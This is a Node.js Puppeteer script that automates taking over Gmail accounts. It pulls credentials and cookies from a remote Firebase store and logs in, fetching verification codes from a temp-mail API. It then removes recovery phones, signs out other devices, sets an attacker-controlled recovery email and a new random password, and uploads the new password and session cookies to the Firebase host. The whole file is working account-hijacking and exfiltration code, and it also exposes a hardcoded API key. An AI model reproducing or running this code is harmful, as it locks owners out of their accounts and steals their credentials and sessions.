const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const axios = require('axios')


const BASE_URL = 'https://job-server-088-default-rtdb.firebaseio.com/raiyan088/' 


let mCookie = [
    {
      name: 'LSID',
      value: '',       
      domain: 'accounts.google.com',
      path: '/',
      expires: 1768227818.828837,
      size: 94,
      httpOnly: true,
      secure: true,
      session: false,
      sameSite: 'None',
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'OSID',
      value: '',
      domain: 'myaccount.google.com',
      path: '/',
      expires: 1771251816.153073,
      size: 157,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SAPISID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957588,
      size: 41,
      httpOnly: false,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'APISID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957573,
      size: 40,
      httpOnly: false,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957563,
      size: 21,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: '__Secure-1PSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957496,
      size: 167,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: true,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957482,
      size: 156,
      httpOnly: false,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'HSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957553,
      size: 21,
      httpOnly: true,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    }
]

puppeteer.use(StealthPlugin())


startServer()


async function startServer() {
    while (true) {
        let data = await getGmailData()
        
        if (data) {
            await loginWithCompleted(data)
            // await delay(10000000)
        } else {
            await delay(10000)
        }
    }
}

async function loginWithCompleted(mData) {
    try {
        let validCookie = await isValidCookies(mData.cookies)

        if (!validCookie) {
            console.log('Old Cookies Expire: '+mData.number)
        }

        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-notifications',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ]
        })
    
        let loadCookie = {}
        let tempCookie = mData.cookies.split(';')

        for (let i = 0; i < tempCookie.length; i++) {
            try {
                let split = tempCookie[i].trim().split('=')
                if (split.length == 2) {
                    loadCookie[split[0]] = split[1]
                }
            } catch (error) {}
        }

        mCookie.forEach((cookie) => {
            let value = loadCookie[cookie['name']]

            if (value) {
                cookie['value'] = value
                cookie['size'] = value.length
            }
        })

        let page = (await browser.pages())[0]

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

        await page.setCookie(...mCookie)

        let mPassword = null
        let otpError = false
        let loginReject = false
        let dYear = null
        let mRapt = null

        console.log(mData.gmail, mData.password, mData.year)

        let mToken = await getGmailId(mData.gmail)
        
        if (!validCookie) {
            validCookie = await waitForGmailLogin(page, mData.gmail, mData.password, mToken)
            mRapt = await getRapt(await page.url())
            console.log('Rapt Token: '+mRapt)
        }

        if (validCookie) {
            try {
                dYear = await waitForDeviceLogout(page)
    
                if (mRapt == null) {
                    for (let j = 0; j < 2; j++) {
                        await page.goto('https://myaccount.google.com/signinoptions/rescuephone', { waitUntil: 'load', timeout: 0 })
                        await delay(500)
                        otpError = false
                        loginReject = false
                        let url = await page.url()
        
                        if (url.startsWith('https://myaccount.google.com/signinoptions/rescuephone')) {
                            mRapt = await getRapt(url)
                            console.log('Rapt Token: '+mRapt)
                        } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
                            console.log('Login Challenge: '+mData.number)
                            await page.type('input[type="password"]', mData.password)
                            await delay(500)
                            await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
        
                            let cSelection = true
                            let tAnotherWay = true
                            let changePassword = true
                            let OTP = null
                            
                            for (let load = 0; load < 30; load++) {
                                try {
                                    let url = await page.url()
        
                                    if (url.startsWith('https://myaccount.google.com/signinoptions/rescuephone')) {
                                        mRapt = await getRapt(url)
                                        break
                                    } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/selection') && cSelection) {
                                        console.log('Selection Page')
                                        await waitForSelector(page, 'div[data-action="accountrecovery"]')
                                        if (await exists(page, 'div[data-action="selectchallenge"][data-challengeid="7"]')) {
                                            try {
                                                await delay(1000)
                                                cSelection = false
                                                await page.click('div[data-action="selectchallenge"][data-challengeid="7"]')
                                                console.log('Gmail Verification Click')
                                                await waitForSelector(page, '#idvPinId')
                                                console.log('Gmail Verification Page')
                                                OTP = await getGmailOTP(mData.gmail, mToken)
                                                console.log('OTP: '+OTP)
                                                if (OTP == null) {
                                                    otpError = true
                                                    break
                                                }
                                                await page.type('#idvPinId', OTP)
                                                await page.click('#idvpreregisteredemailNext')
                                                await delay(3000)
                                            } catch (error) {}
                                        } else {
                                            break
                                        }
                                    } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/dp') && tAnotherWay) {
                                        try {
                                            let tryAnotherWay = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"]'
                                            await waitForSelector(page, tryAnotherWay)
                                            await page.click(tryAnotherWay)
                                            await delay(3000)
                                            tAnotherWay = false
                                        } catch (error) {}
                                    } else if (url.startsWith('https://accounts.google.com/signin/v2/speedbump/changepassword/changepasswordform') && changePassword) {
                                        try {
                                            await waitForSelector(page, 'input[name="Passwd"]')
                                            await delay(500)
                                            mPassword = getRandomPass()
                                            
                                            await page.type('input[name="Passwd"]', mPassword)
                                            await delay(500)
                                            await page.type('input[name="ConfirmPasswd"]', mPassword)
                                            await delay(500)
                                            await page.click('#changepasswordNext')
                                            await delay(3000)
                                            changePassword = false
                                        } catch (error) {}
                                    } else if (url.startsWith('https://accounts.google.com/v3/signin/rejected')) {
                                        loginReject = true
                                        break
                                    }
                                } catch (error) {}
        
                                await delay(500)
                            }
        
                            if (mRapt) {
                                console.log('Login Success: '+mData.number)
                            } else {
                                console.log('Login Failed: '+mData.number)
                                if (otpError) {
                                    continue
                                }
                            }
                        }
                        break
                    }
                }
            } catch (error) {} 
        }
        
        try {
            if (mRapt) {
                let mYear = await waitForNumberRemove(page, mRapt)
                console.log(mYear)
                let mRecovery = await waitForRecoveryAdd(page, mRapt)
                console.log(mRecovery)
                let pYear = await waitForLanguageChange(page)
                if (mPassword == null) mPassword = await waitForPasswordChange(page, mRapt)
                console.log(mPassword)
                mYear = (dYear < mYear) ? dYear : mYear
                mYear = (pYear < mYear) ? pYear : mYear

                let cookies = await getNewCookies(await page.cookies())

                await axios.patch(BASE_URL+'completed/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ recovery: mRecovery, password:mPassword, cookies:cookies, create: mYear }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
            } else if (otpError || loginReject) {
                await axios.patch(BASE_URL+'completed_error/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ password:mData.password, cookies:mData.cookies, otp:otpError }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
            }

            await axios.delete(BASE_URL+'code_old/pending/'+mData.number+'.json')

            await page.goto('about:blank')

        } catch (error) {
            console.log(error);
            
        }

        try {
            if (page != null) {
                await page.close()
            }
        } catch (error) {}

        try {
            if (browser != null) {
                await browser.close()
            }
        } catch (error) {}
    } catch (error) {
        console.log(error);
        
    }
}

async function waitForPasswordChange(page, mRapt) {
    try {
        await page.goto('https://myaccount.google.com/signinoptions/password?rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)
        let mPassword = getRandomPass()
        await page.type('input[name="password"]', mPassword)
        await delay(500)
        await page.type('input[name="confirmation_password"]', mPassword)
        await delay(500)
        await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 wMI9H"]')

        for (let i = 0; i < 20; i++) {
            try {
                let url = await page.url()
                if (url.startsWith('https://myaccount.google.com/security-checkup-welcome')) {
                    break
                }
            } catch (error) {}

            await delay(500)
        }

        return mPassword
    } catch (error) {}

    return mPassword
}

async function waitForNumberRemove(page, mRapt) {
    try {
        await page.goto('https://myaccount.google.com/phone', { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let mYear = await page.evaluate(() => {
            let list = document.querySelectorAll('script')
            let years = []
            let year = parseInt(new Date().getFullYear())

            try {
                for (let i = 0; i < list.length; i++) {
                    let html = list[i].innerHTML
                    if (html.startsWith('AF_initDataCallback') && html.includes('rescuephone')) {
                        let data_list = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))
                        let data = data_list[0]
                        for (let i = 0; i < data.length; i++) {
                            try {
                                let date = data[i][18]
                                if (date > 0) years.push(date)
                            } catch (error) {}
                        }
                    }
                }

                years.sort(function(a, b){return a-b})

                if(years.length > 0) {
                    year = parseInt(new Date(years[0]).getFullYear())
                }
            } catch (error) {}

            return year
        })
        
        console.log('Create Year: '+mYear)

        let mList = await page.evaluate(() => {
            let root = document.querySelectorAll('div[data-encrypted-phone]')
            let list = []
        
            if (root) {
                for (let i = 0; i < root.length; i++) {
                    try {
                        let data = root[i].getAttribute('data-encrypted-phone')
                        if (data) {
                            list.push(data)
                        }
                    } catch (error) {}
                }
            }

            return list
        })

        for (let i = 0; i < mList.length; i++) {
            try {
                await page.goto('https://myaccount.google.com/phone?rapt='+mRapt+'&ph='+mList[i], { waitUntil: 'load', timeout: 0 })
                await delay(500)
                if (await exists(page, 'button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')) {
                    let button = await page.$$('button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')
                    if (button && button.length > 0) {
                        await button[button.length-1].click()
                        await delay(1000)
                    }
                } else if (await exists(page, 'button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')) {
                    let button = await page.$$('button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')
                    if (button && button.length > 0) {
                        await button[button.length-1].click()
                        await delay(1000)
                    }
                }
                for (let i = 0; i < 2; i++) {
                    let button = await page.$$('div[class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc kHssdc HvOprf FsOtSd M9Bg4d"]')
                    if (button && button.length == 2) {
                        await button[1].click()
                        await delay(3000)
                    } else {
                        await delay(1000)
                    }
                }
            } catch (error) {}
        }

        return mYear
    } catch (error) {}

    return parseInt(new Date().getFullYear())
}

async function waitForRecoveryAdd(page, mRapt) {
    try {
        await page.goto('https://myaccount.google.com/recovery/email?rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let hasMail = await page.evaluate(() => {
            let root = document.querySelector('input[type="email"]')
            if (root) {
                return root.value.length > 0
            }
        })

        let mRecovery = getRandomUser()+'@oletters.com'

        await page.focus('input[type="email"]')
        if (hasMail) {
            await page.keyboard.down('Control')
            await page.keyboard.press('A')
            await page.keyboard.up('Control')
            await page.keyboard.press('Backspace')
        }
        await page.keyboard.type(mRecovery)
        await delay(500)
        await page.click('button[type="submit"]')
        await delay(3000)

        return mRecovery
    } catch (error) {}

    return null
}

async function waitForDeviceLogout(page) {
    try {
        await page.goto('https://myaccount.google.com/device-activity', { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let mDevice = await page.evaluate(() => {
            let list = document.querySelectorAll('script')
            let year = parseInt(new Date().getFullYear())
            let logout = []
            let years = []
            let data = []

            for (let i = 0; i < list.length; i++) {
                let html = list[i].innerHTML
                if (html.startsWith('AF_initDataCallback') && !html.includes('mail.google.com') && !html.includes('meet.google.com')) {
                    data = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))[1]
                    break
                }
            }

            for(let i=0; i<data.length; i++) {
                let child = data[i][2]
                for(let j=0; j<child.length; j++) {
                    let main = child[j]
                    if(main.length > 9) {
                        years.push(main[9])
                    }
                    if(main.length > 23) {
                        if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
                            logout.push(main[0])
                        }
                    }
                }
            }

            years.sort(function(a, b){return a-b})

            if(years.length > 0) {
                year = parseInt(new Date(years[0]).getFullYear())
            }

            return { list:logout, year:year }
        })

        for (let i = 0; i < mDevice.list.length; i++) {
            try {
                await page.goto('https://myaccount.google.com/device-activity/id/'+mDevice.list[i], { waitUntil: 'load', timeout: 0 })
                await delay(500)
                await page.click('button[class="VfPpkd-rOvkhd-jPmIDe VfPpkd-rOvkhd-jPmIDe-OWXEXe-ssJRIf"]')
                await delay(1000)
                let button = await page.$$('button[class="VfPpkd-LgbsSe ksBjEc lKxP2d LQeN7 SdOXCb LjrPGf HvOprf evJWRb"]')
                if (button && button.length == 2) {
                    await button[1].click()
                    await delay(2000)
                }
            } catch (error) {}
        }

        return mDevice.year
    } catch (error) {}
}

async function waitForLanguageChange(page) {
    try {
        await page.goto('https://myaccount.google.com/language', { waitUntil: 'load', timeout: 0 })
        await delay(500)
        let isEnglish = await page.evaluate(() => {
            let root = document.querySelector('div[class="xsr7od"]')
            if (root) {
                return root.lang.startsWith('en')
            }
            return false
        })

        if (!isEnglish) {
            await page.evaluate(() => {
                return (async () => {
                    try {
                        let body = window.WIZ_global_data.cfb2h
                        let time = window.WIZ_global_data.SNlM0e.replace(':', '%3A')

                        await fetch('https://myaccount.google.com/_/language_update?bl='+body+'&soc-app=1&soc-platform=1&soc-device=1&rt=j', {
                            'headers': {
                            'accept': '*/*',
                            'accept-language': 'en-US,en;q=0.9',
                            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                            'sec-ch-ua': '\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"',
                            'sec-ch-ua-arch': '\"x86\"',
                            'sec-ch-ua-bitness': '\"64\"',
                            'sec-ch-ua-full-version': '\"112.0.5614.0\"',
                            'sec-ch-ua-full-version-list': '\"Not:A-Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"112.0.5614.0\"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-model': '\"\"',
                            'sec-ch-ua-platform': '\"Windows\"',
                            'sec-ch-ua-platform-version': '\"19.0.0\"',
                            'sec-ch-ua-wow64': '?0',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'x-client-data': 'COP7ygE=',
                            'x-same-domain': '1'
                            },
                            'referrer': 'https://myaccount.google.com/language?nlr=1',
                            'referrerPolicy': 'origin-when-cross-origin',
                            'body': 'f.req=%5B%5B%22en%22%5D%5D&at='+time+'&',
                            'method': 'POST',
                            'mode': 'cors',
                            'credentials': 'include'
                        })
                    } catch (error) {}
                    return true
                })()
            })
        }

        await page.goto('https://myaccount.google.com/security', { waitUntil: 'load', timeout: 0 })
        await delay(500)

        return await page.evaluate(() => {
            let years = ['2025', '2024', '2023', '2022', '2021', '2020', '2019', '2018', '2017', '2016', '2015']
            let root = document.querySelectorAll('a[href*="signinoptions/password"]')
            if (root) {
                for (let i = 0; i < root.length; i++) {
                    try {
                        let text = root[i].innerText
                        let year = null

                        for (let j = 0; j < years.length; j++) {
                            if (text.includes(years[j])) {
                                year = years[j]
                                break
                            }
                        }

                        if (year) {
                            return parseInt(year)
                        }
                    } catch (error) {}
                }
            }

            return null
        })
    } catch (error) {}
}

async function waitForGmailLogin(page, mUser, mPassword, mToken) {
    await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com/device-activity', { waitUntil: 'load', timeout: 0 })
    await delay(1000)
    await page.type('#identifierId', mUser)
    await delay(500)
    await page.click('#identifierNext')
    let status = await waitForLoginStatus(page)
    if (status == 1) {
        await delay(1000)
        await waitForPasswordType(page, mPassword)
        await delay(500)
        await page.click('#passwordNext')

        let status = await waitForLoginSuccess(page)
        if (status == 3) {
            await waitForSelector(page, 'div[data-action="accountrecovery"]')

            if (await exists(page, 'div[data-action="selectchallenge"][data-challengeid="3"]')) {
                await delay(1000)
                await page.click('div[data-action="selectchallenge"][data-challengeid="3"]')
                await waitForSelector(page, '#idvPinId')
                let otp = await getGmailOTP(mUser, mToken)
                await page.type('#idvPinId', otp)
                await page.click('#idvpreregisteredemailNext')
                status = await waitForLoginSuccess(page)   
            }
        }

        return status == 1
    }

    return false
}

async function waitForLoginStatus(page) {
    let status = 0
    
    for (let i = 0; i < 30; i++) {
        try {
            let pageUrl = await page.evaluate(() => window.location.href)
            
            if (pageUrl) {
                if (pageUrl.startsWith('https://accounts.google.com/v3/signin/identifier')) {
                    let captcha = await page.waitForRequest(req => req.url())
                    if (captcha.url().startsWith('https://accounts.google.com/Captcha')) {
                        status = 9
                        break
                    }
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
                    status = 1
                    break
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/rejected')) {
                    status = 2
                    break
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/dp')) {
                    status = 3
                    break
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/recaptcha')) {
                    status = 4
                    break
                } else if(pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pk/presend')) {
                    status = 5
                    break
                }
            }
        } catch (error) {}

        await delay(500)
    }
    return status
}

async function waitForLoginSuccess(page) {
    let status = 0
    
    for (let i = 0; i < 30; i++) {
        try {
            let pageUrl = await page.evaluate(() => window.location.href)
            
            if (pageUrl.startsWith('https://gds.google.com/web')) {
                status = 1
                break
            } else if (pageUrl.startsWith('https://myaccount.google.com')) {
                status = 1
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
                let wrong = await page.evaluate(() => {
                    let root = document.querySelector('div[class="Ly8vae uSvLId"] > div')
                    if (root) {
                        return true
                    }
                    return false
                })

                if (wrong) {
                    status = 2
                    break
                }
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/selection')) {
                status = 3
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/dp')) {
                status = 4
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/collect')) {
                status = 5
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/ootp')) {
                status = 6
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/signin/v2/passkeyenrollment')) {
                let notNow = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"]'
                await waitForSelector(page, notNow)
                await page.click(notNow)
                await delay(3000)
            }
        } catch (error) {}

        await delay(500)
    }

    return status
}

async function waitForPasswordType(page, password) {
    
    for (let i = 0; i < 10; i++) {
        await delay(1000)

        try {
            let data = await exists(page, 'input[type="password"]')
            if (data) {
                await page.type('input[type="password"]', password)

                let success = await page.evaluate((password) => {
                    try {
                        let root = document.querySelector('input[type="password"]')
                        if (root && root.value == password) {
                            return true
                        }
                    } catch (error) {}

                    return false
                }, password)

                if (success) {
                    break
                }
            }
        } catch (error) {}
    }
}

async function waitForSelector(page, element, _timeout = 30) {

    for (let i = 0; i < _timeout; i++) {
        try {
            let data = await exists(page, element)
            if (data) {
                break
            }
        } catch (error) {}

        await delay(500)
    }
}

async function isValidCookies(cookies) {
    try {
        let response = await axios.get('https://myaccount.google.com/phone', {
            headers: {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'cookie': cookies,
                'priority': 'u=0, i',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-form-factors': '"Desktop"',
                'sec-ch-ua-full-version': '"131.0.6778.265"',
                'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.265", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"19.0.0"',
                'sec-ch-ua-wow64': '?0',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            },
            validateStatus: null,
            maxRedirects: 0
        })

        let location = response.headers['location']

        if (location) {
            return false
        } else {
            return true
        }
    } catch (error) {}

    return false
}

async function getNewCookies(cookies) {
    let cookie = ''

    for (let i = 0; i < cookies.length; i++) {
        try {
            cookie += cookies[i]['name']+'='+cookies[i]['value']+(i == cookies.length-1 ? '' : '; ')
        } catch (error) {}
    }

    return cookie
}

async function getRapt(url) {
    try {
        if (url.includes('rapt=')) {
            let temp = url.substring(url.indexOf('rapt=')+5, url.length)

            if (temp.includes('&')) {
                return temp.substring(0, temp.indexOf('&'))
            } else {
                return temp
            }
        }
    } catch (error) {}

    return null
}

async function exists(page, element) {
    return await page.evaluate((element) => {
        let root = document.querySelector(element)
        if (root) {
            return true
        }
        return false
    }, element)
}

async function getGmailData() {

    try {
        let response = await axios.get(BASE_URL+'code_old/pending.json?orderBy=%22$key%22&limitToFirst=1')
        let data = response.data
        if (data) {
            let number = Object.keys(data)[0]
            data[number]['number'] = number
            return data[number]
        }
    } catch (error) {}

    return null
}

async function getGmailId(user) {
    for (let i = 0; i < 3; i++) {
        try {
            let response = await axios.post('https://mail-server.1timetech.com/api/email?params=%3D03e', { 'data': reverse(encode('{"email":"'+user+'@gmail10p.com"}')) }, {
                headers: {
                    'Host': 'mail-server.1timetech.com',
                    'Accept': 'application/json',
                    'X-App-Key': 'f07bed4503msh719c2010df3389fp1d6048jsn411a41a84a3c',
                    'Content-Type': 'application/json',
                    'Accept-Encoding': 'gzip, deflate',
                    'User-Agent': 'okhttp/4.9.2',
                    'Connection': 'close'
                }
            })

            let data = JSON.parse(decode(reverse(response.data['data'])))

            if (data.success) {
                return data.id
            }
        } catch (error) {}

        await delay(1000)
    }

    return null
}

async function getGmailOTP(user, mId) {
    let msgId = null

    for (let i = 0; i < 30; i++) {
        try {
            let response = await axios.get('https://mail-server.1timetech.com/api/email/'+mId+'/messages?params='+reverse(encode('{"email":"'+user+'@gmail10p.com"}')), {
                headers: {
                    'Host': 'mail-server.1timetech.com',
                    'Accept': 'application/json',
                    'X-App-Key': 'f07bed4503msh719c2010df3389fp1d6048jsn411a41a84a3c',
                    'Accept-Encoding': 'gzip, deflate',
                    'User-Agent': 'okhttp/4.9.2',
                    'Connection': 'close'
                },
                validateStatus: null
            })
            
            let list = JSON.parse(decode(reverse(response.data['data'])))
            
            list.sort(function(lhs, rhs){return rhs.createdAt-lhs.createdAt})

            for (let i = 0; i < list.length; i++) {
                if (list[i]['subject'] == 'Google Verification Code' && list[i]['createdAt'] > new Date().getTime()-120000) {
                    msgId = list[i]['id']
                    break
                }
            }

            if (msgId) {
                break
            }
        } catch (error) {}

        await delay(1000)
    }
    
    if (msgId) {
        for (let i = 0; i < 5; i++) {
            try {
                let response = await axios.get('https://mail-server.1timetech.com/api/email/'+mId+'/messages/'+msgId+'?params='+reverse(encode('{"email":"'+user+'@gmail10p.com"}')), {
                    headers: {
                        'Host': 'mail-server.1timetech.com',
                        'Accept': 'application/json',
                        'X-App-Key': 'f07bed4503msh719c2010df3389fp1d6048jsn411a41a84a3c',
                        'Accept-Encoding': 'gzip, deflate',
                        'User-Agent': 'okhttp/4.9.2',
                        'Connection': 'close'
                    },
                    validateStatus: null
                })
                
                let data = JSON.parse(decode(reverse(response.data['data'])))
                let otp = null

                data['text'].split(/\r?\n/).forEach(function(line) {
                    if(line.trim().length == 6 && isAllNumber(line.trim())) {
                        otp = line.trim()
                    }
                })
                
                if (otp) {
                    return otp   
                }
            } catch (error) {}

            await delay(1000)
        }
    }

    return null
}

function getRandomUser() {
    let L = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    
    let user = ''

    for (let i = 0; i < 10; i++) {
        user += L[Math.floor((Math.random() * L.length))]
    }

    for (let i = 0; i < 5; i++) {
        user += N[Math.floor((Math.random() * N.length))]
    }

    return user
}

function getRandomPass() {
    let L = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    
    let pass = L[Math.floor((Math.random() * L.length))].toUpperCase()

    for (let i = 0; i < 6; i++) {
        pass += L[Math.floor((Math.random() * L.length))]
    }

    for (let i = 0; i < 3; i++) {
        pass += N[Math.floor((Math.random() * N.length))]
    }

    return pass
}

function isAllNumber(str) {
    let number = true
    
    for(let char of str.split('')) {
        if (!(char >= '0' && char <= '9')) {
            number = false
        }
    }
    
    return number
}

function reverse(str) { 
    return str.split('').reverse().join('')
}

function encode(str) {
    return Buffer.from(str).toString('base64')
}

function decode(str) {
    return Buffer.from(str, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
